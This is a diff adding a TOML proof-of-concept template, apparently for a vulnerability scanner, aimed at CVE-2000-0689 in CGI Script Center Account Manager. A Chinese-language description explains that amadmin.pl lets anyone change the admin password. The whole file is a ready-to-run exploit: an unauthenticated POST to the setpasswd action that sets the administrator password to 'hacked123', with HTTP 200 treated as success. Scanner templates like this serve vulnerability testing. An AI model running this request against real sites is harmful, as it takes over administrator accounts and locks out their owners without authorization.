@@ -1,0 +1,34 @@
+[info]
+author = "ave"
+description = "CGI Script Center Account Manager 1.0 LITE/PRO 的 amadmin.pl 脚本未对 setpasswd 操作进行身份验证，远程攻击者可通过 POST 请求直接修改管理员密码。发送 pwd 和 pwd2 参数即可设置新密码，获取完全管理权限。"
+id = "POC-AVE-2000-0539"
+name = "CGI Script Center Account Manager 远程密码修改 PoC"
+severity = "high"
+tags = ["ave-2000-0539"]
+vuln_id = [
+    "CVE-2000-0689",
+    "AVE-2000-0539",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/amadmin.pl?setpasswd"
+protocol = "http"
+
+[poc.requests.body]
+type = "form"
+
+[poc.requests.body.content]
+pwd = "hacked123"
+pwd2 = "hacked123"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
